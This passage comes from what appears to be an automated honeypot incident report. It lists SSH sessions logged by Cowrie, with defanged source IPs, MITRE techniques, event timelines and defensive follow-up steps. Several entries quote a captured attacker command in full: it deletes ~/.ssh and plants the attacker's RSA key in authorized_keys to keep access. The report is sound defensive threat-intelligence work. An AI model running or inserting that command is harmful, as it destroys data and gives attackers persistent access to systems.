**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b30d3a9c7f6

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 07:42 |
| **Last Seen** | 2026-03-17 07:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:42:34` | `cowrie.session.connect` |
| `2026-03-17 07:42:35` | `cowrie.client.version` |
| `2026-03-17 07:42:35` | `cowrie.client.kex` |
| `2026-03-17 07:42:45` | `cowrie.login.success` |
| `2026-03-17 07:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37906afd6b9a

| Field | Detail |
|---|---|
| **Source IP** | `103.139.154[.]160` |
| **First Seen** | 2026-03-17 07:52 |
| **Last Seen** | 2026-03-17 07:53 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:52:22` | `cowrie.session.connect` |
| `2026-03-17 07:52:22` | `cowrie.login.success` |
| `2026-03-17 07:52:22` | `cowrie.session.params` |
| `2026-03-17 07:53:14` | `cowrie.log.closed` |
| `2026-03-17 07:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.154[.]160` to AbuseIPDB if not already reported
- [ ] Block `103.139.154[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-829b6bed129a

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 07:59 |
| **Last Seen** | 2026-03-17 07:59 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:59:23` | `cowrie.session.connect` |
| `2026-03-17 07:59:27` | `cowrie.client.version` |
| `2026-03-17 07:59:27` | `cowrie.client.kex` |
| `2026-03-17 07:59:45` | `cowrie.login.success` |
| `2026-03-17 07:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24ba5744671

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-03-17 08:00 |
| **Last Seen** | 2026-03-17 08:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:00:34` | `cowrie.session.connect` |
| `2026-03-17 08:00:34` | `cowrie.client.version` |
| `2026-03-17 08:00:34` | `cowrie.client.kex` |
| `2026-03-17 08:00:35` | `cowrie.login.success` |
| `2026-03-17 08:00:36` | `cowrie.session.params` |
| `2026-03-17 08:00:36` | `cowrie.command.input` |
| `2026-03-17 08:00:36` | `cowrie.command.failed` |
| `2026-03-17 08:00:36` | `cowrie.log.closed` |
| `2026-03-17 08:00:36` | `cowrie.session.params` |
| `2026-03-17 08:00:36` | `cowrie.command.input` |
| `2026-03-17 08:00:37` | `cowrie.session.file_download` |
| `2026-03-17 08:00:37` | `cowrie.log.closed` |
| `2026-03-17 08:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a91558ab0b

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-03-17 08:00 |
| **Last Seen** | 2026-03-17 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:00:40` | `cowrie.session.connect` |
| `2026-03-17 08:00:40` | `cowrie.client.version` |
| `2026-03-17 08:00:40` | `cowrie.client.kex` |
| `2026-03-17 08:00:41` | `cowrie.login.success` |
| `2026-03-17 08:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ebbd4e2a27

| Field | Detail |
|---|---|
| **Source IP** | `118.99.80[.]40` |
| **First Seen** | 2026-03-17 08:06 |
| **Last Seen** | 2026-03-17 08:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:06:38` | `cowrie.session.connect` |
| `2026-03-17 08:06:38` | `cowrie.client.version` |
| `2026-03-17 08:06:38` | `cowrie.client.kex` |
| `2026-03-17 08:06:39` | `cowrie.login.success` |
| `2026-03-17 08:06:39` | `cowrie.session.params` |
| `2026-03-17 08:06:39` | `cowrie.command.input` |
| `2026-03-17 08:06:39` | `cowrie.command.failed` |
| `2026-03-17 08:06:39` | `cowrie.log.closed` |
| `2026-03-17 08:06:40` | `cowrie.session.params` |
| `2026-03-17 08:06:40` | `cowrie.command.input` |
| `2026-03-17 08:06:40` | `cowrie.session.file_download` |
| `2026-03-17 08:06:40` | `cowrie.log.closed` |
| `2026-03-17 08:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `118.99.80[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20dafa47b7fe

| Field | Detail |
|---|---|
| **Source IP** | `118.99.80[.]40` |
| **First Seen** | 2026-03-17 08:06 |
| **Last Seen** | 2026-03-17 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:06:42` | `cowrie.session.connect` |
| `2026-03-17 08:06:42` | `cowrie.client.version` |
| `2026-03-17 08:06:43` | `cowrie.client.kex` |
| `2026-03-17 08:06:43` | `cowrie.login.success` |
| `2026-03-17 08:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `118.99.80[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39c07268730

| Field | Detail |
|---|---|
| **Source IP** | `118.99.80[.]40` |
| **First Seen** | 2026-03-17 08:08 |
| **Last Seen** | 2026-03-17 08:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:08:50` | `cowrie.session.connect` |
| `2026-03-17 08:08:50` | `cowrie.client.version` |
| `2026-03-17 08:08:50` | `cowrie.client.kex` |
| `2026-03-17 08:08:51` | `cowrie.login.success` |
| `2026-03-17 08:08:51` | `cowrie.session.params` |
| `2026-03-17 08:08:51` | `cowrie.command.input` |
| `2026-03-17 08:08:51` | `cowrie.command.failed` |
| `2026-03-17 08:08:52` | `cowrie.log.closed` |
| `2026-03-17 08:08:52` | `cowrie.session.params` |
| `2026-03-17 08:08:52` | `cowrie.command.input` |
| `2026-03-17 08:08:52` | `cowrie.session.file_download` |
| `2026-03-17 08:08:52` | `cowrie.log.closed` |
| `2026-03-17 08:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `118.99.80[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-975d302a40cb

| Field | Detail |
|---|---|
| **Source IP** | `118.99.80[.]40` |
| **First Seen** | 2026-03-17 08:08 |
| **Last Seen** | 2026-03-17 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:08:55` | `cowrie.session.connect` |
| `2026-03-17 08:08:55` | `cowrie.client.version` |
| `2026-03-17 08:08:55` | `cowrie.client.kex` |
| `2026-03-17 08:08:55` | `cowrie.login.success` |
| `2026-03-17 08:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `118.99.80[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235756975819

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-03-17 08:10 |
| **Last Seen** | 2026-03-17 08:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:10:37` | `cowrie.session.connect` |
| `2026-03-17 08:10:37` | `cowrie.client.version` |
| `2026-03-17 08:10:37` | `cowrie.client.kex` |
| `2026-03-17 08:10:38` | `cowrie.login.success` |
| `2026-03-17 08:10:38` | `cowrie.session.params` |
| `2026-03-17 08:10:38` | `cowrie.command.input` |
| `2026-03-17 08:10:38` | `cowrie.command.failed` |
| `2026-03-17 08:10:39` | `cowrie.log.closed` |
| `2026-03-17 08:10:39` | `cowrie.session.params` |
| `2026-03-17 08:10:39` | `cowrie.command.input` |
| `2026-03-17 08:10:39` | `cowrie.session.file_download` |
| `2026-03-17 08:10:39` | `cowrie.log.closed` |
| `2026-03-17 08:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2843b9a6b1

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-03-17 08:10 |
| **Last Seen** | 2026-03-17 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:10:42` | `cowrie.session.connect` |
| `2026-03-17 08:10:42` | `cowrie.client.version` |
| `2026-03-17 08:10:43` | `cowrie.client.kex` |
| `2026-03-17 08:10:44` | `cowrie.login.success` |
| `2026-03-17 08:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e4d1eba461

| Field | Detail |
|---|---|
| **Source IP** | `118.99.80[.]40` |
| **First Seen** | 2026-03-17 08:10 |
| **Last Seen** | 2026-03-17 08:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:10:57` | `cowrie.session.connect` |
| `2026-03-17 08:10:57` | `cowrie.client.version` |
| `2026-03-17 08:10:57` | `cowrie.client.kex` |
| `2026-03-17 08:10:58` | `cowrie.login.success` |
| `2026-03-17 08:10:59` | `cowrie.session.params` |
| `2026-03-17 08:10:59` | `cowrie.command.input` |
| `2026-03-17 08:10:59` | `cowrie.command.failed` |
| `2026-03-17 08:10:59` | `cowrie.log.closed` |
| `2026-03-17 08:10:59` | `cowrie.session.params` |
| `2026-03-17 08:10:59` | `cowrie.command.input` |
| `2026-03-17 08:10:59` | `cowrie.session.file_download` |
| `2026-03-17 08:10:59` | `cowrie.log.closed` |
| `2026-03-17 08:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `118.99.80[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885c823a34ac

| Field | Detail |
|---|---|
| **Source IP** | `118.99.80[.]40` |
| **First Seen** | 2026-03-17 08:11 |
| **Last Seen** | 2026-03-17 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:11:02` | `cowrie.session.connect` |
| `2026-03-17 08:11:02` | `cowrie.client.version` |
| `2026-03-17 08:11:02` | `cowrie.client.kex` |
| `2026-03-17 08:11:02` | `cowrie.login.success` |
| `2026-03-17 08:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `118.99.80[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b62a42a3b81

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 08:14 |
| **Last Seen** | 2026-03-17 08:15 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:14:53` | `cowrie.session.connect` |
| `2026-03-17 08:14:55` | `cowrie.client.version` |
| `2026-03-17 08:14:55` | `cowrie.client.kex` |
| `2026-03-17 08:15:04` | `cowrie.login.success` |
| `2026-03-17 08:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6e4ae33341

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-03-17 08:16 |
| **Last Seen** | 2026-03-17 08:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:16:43` | `cowrie.session.connect` |
| `2026-03-17 08:16:43` | `cowrie.client.version` |
| `2026-03-17 08:16:43` | `cowrie.client.kex` |
| `2026-03-17 08:16:44` | `cowrie.login.success` |
| `2026-03-17 08:16:44` | `cowrie.session.params` |
| `2026-03-17 08:16:44` | `cowrie.command.input` |
| `2026-03-17 08:16:44` | `cowrie.command.failed` |
| `2026-03-17 08:16:45` | `cowrie.log.closed` |
| `2026-03-17 08:16:45` | `cowrie.session.params` |
| `2026-03-17 08:16:45` | `cowrie.command.input` |
| `2026-03-17 08:16:45` | `cowrie.session.file_download` |
| `2026-03-17 08:16:45` | `cowrie.log.closed` |
| `2026-03-17 08:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a22b764d308f

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-03-17 08:16 |
| **Last Seen** | 2026-03-17 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:16:48` | `cowrie.session.connect` |
| `2026-03-17 08:16:48` | `cowrie.client.version` |
| `2026-03-17 08:16:49` | `cowrie.client.kex` |
| `2026-03-17 08:16:50` | `cowrie.login.success` |
| `2026-03-17 08:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c909600675

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 08:27 |
| **Last Seen** | 2026-03-17 08:28 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:27:58` | `cowrie.session.connect` |
| `2026-03-17 08:27:58` | `cowrie.client.version` |
| `2026-03-17 08:27:58` | `cowrie.client.kex` |
| `2026-03-17 08:28:08` | `cowrie.login.success` |
| `2026-03-17 08:28:19` | `cowrie.session.params` |
| `2026-03-17 08:28:19` | `cowrie.command.input` |
| `2026-03-17 08:28:29` | `cowrie.log.closed` |
| `2026-03-17 08:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a544f5c9d92

| Field | Detail |
|---|---|
| **Source IP** | `181.49.3[.]38` |
| **First Seen** | 2026-03-17 08:37 |
| **Last Seen** | 2026-03-17 08:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:37:26` | `cowrie.session.connect` |
| `2026-03-17 08:37:27` | `cowrie.client.version` |
| `2026-03-17 08:37:27` | `cowrie.client.kex` |
| `2026-03-17 08:37:29` | `cowrie.login.success` |
| `2026-03-17 08:37:30` | `cowrie.direct-tcpip.request` |
| `2026-03-17 08:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.49.3[.]38` to AbuseIPDB if not already reported
- [ ] Block `181.49.3[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7228875a6b4e

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 08:37 |
| **Last Seen** | 2026-03-17 08:38 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:37:55` | `cowrie.session.connect` |
| `2026-03-17 08:37:56` | `cowrie.client.version` |
| `2026-03-17 08:37:56` | `cowrie.client.kex` |
| `2026-03-17 08:38:05` | `cowrie.login.success` |
| `2026-03-17 08:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7141a7a2e74

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 08:47 |
| **Last Seen** | 2026-03-17 08:48 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 08:47:52` | `cowrie.session.connect` |
| `2026-03-17 08:47:53` | `cowrie.client.version` |
| `2026-03-17 08:47:53` | `cowrie.client.kex` |
| `2026-03-17 08:48:03` | `cowrie.login.success` |
| `2026-03-17 08:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.201.57[.]104` | **15** | 2026-03-17 03:11 | 2026-03-17 03:27 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.106[.]113` | **15** | 2026-03-17 07:00 | 2026-03-17 07:29 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.42[.]17` | **15** | 2026-03-17 03:00 | 2026-03-17 03:10 | 20m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
